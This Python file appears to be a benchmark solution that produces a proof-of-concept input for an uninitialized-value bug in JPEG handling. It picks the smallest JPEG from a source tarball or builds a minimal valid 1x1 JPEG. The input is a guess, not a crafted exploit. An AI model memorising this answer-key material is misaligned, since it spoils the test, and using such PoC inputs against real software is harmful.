import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that should trigger the uninitialized value
        vulnerability. Prefer a JPEG from the source tarball if present;
        otherwise, fall back to a minimal valid JPEG constructed in-code.
        """
        try:
            with tarfile.open(src_path, "r:*") as tf:
                best_member = None
                best_size = None
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name.lower()
                    if name.endswith(".jpg") or name.endswith(".jpeg"):
                        size = member.size
                        if size <= 0:
                            continue
                        if best_size is None or size < best_size:
                            best_size = size
                            best_member = member
                if best_member is not None:
                    f = tf.extractfile(best_member)
                    if f is not None:
                        data = f.read()
                        if isinstance(data, bytes) and data:
                            return data
        except Exception:
            # If anything goes wrong while reading the tarball, fall back.
            pass

        # Fallback: a tiny, baseline, JFIF-compliant JPEG (1x1 image).
        return self._fallback_jpeg()

    @staticmethod
    def _fallback_jpeg() -> bytes:
        """
        Return a minimal, valid baseline JPEG image (1x1 pixel, YCbCr).
        Uses very simple quantization and Huffman tables; all coefficients
        are zero, so the image is just a flat color.
        """
        data = bytearray()

        # SOI
        data += b"\xff\xd8"

        # APP0 (JFIF)
        data += (
            b"\xff\xe0"      # APP0 marker
            b"\x00\x10"      # length = 16
            b"JFIF\x00"      # identifier
            b"\x01\x01"      # version 1.01
            b"\x00"          # units: 0 = no units
            b"\x00\x01"      # X density
            b"\x00\x01"      # Y density
            b"\x00"          # X thumbnail
            b"\x00"          # Y thumbnail
        )

        # DQT: one quantization table (ID=0), all ones
        data += b"\xff\xdb"  # DQT marker
        data += b"\x00\x43"  # length = 67 (2 + 65)
        data += b"\x00"      # Pq=0 (8-bit), Tq=0
        data += b"\x01" * 64  # 8x8 table, all 1's (valid, non-zero)

        # SOF0: Baseline DCT, 1x1 image, 3 components (Y, Cb, Cr)
        data += b"\xff\xc0"      # SOF0 marker
        data += b"\x00\x11"      # length = 17
        data += b"\x08"          # precision = 8 bits
        data += b"\x00\x01"      # height = 1
        data += b"\x00\x01"      # width  = 1
        data += b"\x03"          # number of components = 3

        # Component 1: Y
        data += b"\x01"          # component ID = 1
        data += b"\x11"          # sampling factors: H=1, V=1
        data += b"\x00"          # quantization table = 0

        # Component 2: Cb
        data += b"\x02"          # component ID = 2
        data += b"\x11"          # sampling factors: H=1, V=1
        data += b"\x00"          # quantization table = 0

        # Component 3: Cr
        data += b"\x03"          # component ID = 3
        data += b"\x11"          # sampling factors: H=1, V=1
        data += b"\x00"          # quantization table = 0

        # DHT: DC table 0 with a single symbol (0) of length 1
        data += b"\xff\xc4"      # DHT marker
        data += b"\x00\x14"      # length = 20
        data += b"\x00"          # Tc=0 (DC), Th=0
        data += b"\x01" + b"\x00" * 15  # bits[1]=1, others 0
        data += b"\x00"          # huffval[0] = 0 (DC category 0)

        # DHT: AC table 0 with a single symbol (EOB=0x00) of length 1
        data += b"\xff\xc4"      # DHT marker
        data += b"\x00\x14"      # length = 20
        data += b"\x10"          # Tc=1 (AC), Th=0
        data += b"\x01" + b"\x00" * 15  # bits[1]=1, others 0
        data += b"\x00"          # huffval[0] = 0x00 (EOB)

        # SOS: Start of Scan, 3 components using DC/AC table 0
        data += b"\xff\xda"      # SOS marker
        data += b"\x00\x0c"      # length = 12
        data += b"\x03"          # number of components = 3

        # Component 1: Y, DC=0, AC=0
        data += b"\x01"          # component ID = 1
        data += b"\x00"          # HT: DC=0, AC=0

        # Component 2: Cb, DC=0, AC=0
        data += b"\x02"          # component ID = 2
        data += b"\x00"          # HT: DC=0, AC=0

        # Component 3: Cr, DC=0, AC=0
        data += b"\x03"          # component ID = 3
        data += b"\x00"          # HT: DC=0, AC=0

        # Spectral selection and successive approximation
        data += b"\x00"          # Ss = 0
        data += b"\x3f"          # Se = 63
        data += b"\x00"          # Ah/Al = 0

        # Compressed scan data:
        # Our Huffman tables map code '0' -> value 0 for both DC and AC.
        # For each block (3 blocks in one MCU: Y, Cb, Cr), we need:
        #  - DC category 0: symbol 0  (code '0')
        #  - AC EOB:         symbol 0 (code '0')
        # That is 2 bits per block, 6 bits total -> pack into one 0x00 byte.
        data += b"\x00"

        # EOI
        data += b"\xff\xd9"

        return bytes(data)